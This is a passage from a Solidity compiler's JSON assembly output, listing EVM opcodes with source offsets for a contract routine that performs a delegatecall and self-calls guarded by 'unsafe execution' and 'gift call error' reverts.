										{
											"begin": 2004,
											"end": 2087,
											"name": "AND"
										},
										{
											"begin": 1997,
											"end": 2087,
											"name": "SWAP3"
										},
										{
											"begin": 1997,
											"end": 2087,
											"name": "POP"
										},
										{
											"begin": 2124,
											"end": 2127,
											"name": "DUP1"
										},
										{
											"begin": 2118,
											"end": 2122,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2114,
											"end": 2128,
											"name": "ADD"
										},
										{
											"begin": 2108,
											"end": 2129,
											"name": "MLOAD"
										},
										{
											"begin": 2101,
											"end": 2129,
											"name": "SWAP2"
										},
										{
											"begin": 2101,
											"end": 2129,
											"name": "POP"
										},
										{
											"begin": 1838,
											"end": 2140,
											"name": "POP"
										},
										{
											"begin": 1838,
											"end": 2140,
											"name": "SWAP1"
										},
										{
											"begin": 1838,
											"end": 2140,
											"name": "SWAP2"
										},
										{
											"begin": 1838,
											"end": 2140,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "JUMPDEST"
										},
										{
											"begin": 1336,
											"end": 1346,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1347,
											"end": 1358,
											"name": "DUP1"
										},
										{
											"begin": 1387,
											"end": 1399,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1298,
											"end": 1303,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1303,
											"name": "ISZERO"
										},
										{
											"begin": 1230,
											"end": 1303,
											"name": "ISZERO"
										},
										{
											"begin": 1230,
											"end": 1237,
											"name": "DUP5"
										},
										{
											"begin": 1230,
											"end": 1250,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1230,
											"end": 1250,
											"name": "AND"
										},
										{
											"begin": 1274,
											"end": 1292,
											"name": "PUSH",
											"value": "CBFC4BCE"
										},
										{
											"begin": 1274,
											"end": 1292,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1274,
											"end": 1292,
											"name": "MUL"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "MLOAD"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "ADD"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "SWAP1"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "MSTORE"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "SWAP1"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "NOT"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "AND"
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD"
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD"
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4"
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2"
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4"
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND"
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR"
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 1251,
											"end": 1293,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "MLOAD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP3"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "MLOAD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "ADD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP4"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP4"
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2"
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP2"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "ADD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "AND"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "ISZERO"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "JUMPI"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP3"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SUB"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "MLOAD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP4"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SUB"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "EXP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SUB"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "NOT"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "AND"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP2"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "MSTORE"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "ADD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP2"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "JUMPDEST"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP2"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "MLOAD"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP1"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP4"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SUB"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP2"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DUP6"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "GAS"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "DELEGATECALL"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "SWAP2"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1294,
											"name": "POP"
										},
										{
											"begin": 1230,
											"end": 1303,
											"name": "ISZERO"
										},
										{
											"begin": 1230,
											"end": 1303,
											"name": "ISZERO"
										},
										{
											"begin": 1230,
											"end": 1303,
											"name": "EQ"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "ISZERO"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "ISZERO"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "JUMPI"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "MLOAD"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "MSTORE"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "ADD"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP1"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP1"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "ADD"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP3"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "SUB"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP3"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "MSTORE"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "MSTORE"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "ADD"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP1"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "756E7361666520657865637574696F6E00000000000000000000000000000000"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "MSTORE"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "POP"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "ADD"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "SWAP2"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "POP"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "POP"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "MLOAD"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "DUP1"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "SWAP2"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "SUB"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "SWAP1"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "REVERT"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 1222,
											"end": 1324,
											"name": "JUMPDEST"
										},
										{
											"begin": 1362,
											"end": 1374,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 1362,
											"end": 1372,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 1362,
											"end": 1374,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1362,
											"end": 1374,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 1362,
											"end": 1374,
											"name": "JUMPDEST"
										},
										{
											"begin": 1335,
											"end": 1374,
											"name": "SWAP3"
										},
										{
											"begin": 1335,
											"end": 1374,
											"name": "POP"
										},
										{
											"begin": 1335,
											"end": 1374,
											"name": "SWAP3"
										},
										{
											"begin": 1335,
											"end": 1374,
											"name": "POP"
										},
										{
											"begin": 1410,
											"end": 1414,
											"name": "ADDRESS"
										},
										{
											"begin": 1402,
											"end": 1420,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1402,
											"end": 1420,
											"name": "AND"
										},
										{
											"begin": 1421,
											"end": 1424,
											"name": "DUP4"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "SWAP1"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DIV"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "MLOAD"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DUP2"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "AND"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "MUL"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DUP2"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "MSTORE"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "ADD"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "MLOAD"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DUP1"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DUP4"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "SUB"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DUP2"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "DUP8"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "GAS"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "CALL"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "SWAP3"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "POP"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "POP"
										},
										{
											"begin": 1402,
											"end": 1425,
											"name": "POP"
										},
										{
											"begin": 1387,
											"end": 1425,
											"name": "SWAP1"
										},
										{
											"begin": 1387,
											"end": 1425,
											"name": "POP"
										},
										{
											"begin": 1444,
											"end": 1451,
											"name": "DUP1"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "ISZERO"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "ISZERO"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "JUMPI"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "MLOAD"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP2"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "MSTORE"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "ADD"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP1"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP1"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "ADD"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP3"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP2"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "SUB"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP3"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "MSTORE"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP2"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "MSTORE"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "ADD"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP1"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "676966742063616C6C206572726F720000000000000000000000000000000000"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP2"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "MSTORE"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "POP"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "ADD"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "SWAP2"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "POP"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "POP"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "MLOAD"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "DUP1"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "SWAP2"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "SUB"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "SWAP1"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "REVERT"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 1436,
											"end": 1470,
											"name": "JUMPDEST"
										},
										{
											"begin": 1500,
											"end": 1504,
											"name": "ADDRESS"
										},
										{
											"begin": 1492,
											"end": 1510,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1492,
											"end": 1510,
											"name": "AND"
										},
										{
											"begin": 789,
											"end": 814,
											"name": "PUSH",
											"value": "68E9A07E"
										},
										{
											"begin": 789,
											"end": 814,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 789,
											"end": 814,
											"name": "MUL"
										},
										{
											"begin": 1532,
											"end": 1535,
											"name": "DUP4"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "MLOAD"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "ADD"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "DUP1"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "DUP4"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "NOT"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "AND"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "NOT"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "AND"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "DUP2"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "MSTORE"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "ADD"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "DUP3"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "DUP2"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "MSTORE"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "ADD"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "SWAP3"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "POP"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "POP"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "POP"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "SWAP1"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1511,
											"end": 1536,
											"name": "MSTORE"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "MLOAD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP3"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "MLOAD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "ADD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP4"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP4"
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "49"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2"
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1"
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "49"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP2"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "ADD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP1"
										},
										{
											"begin": 1492,
											"end": 1537,
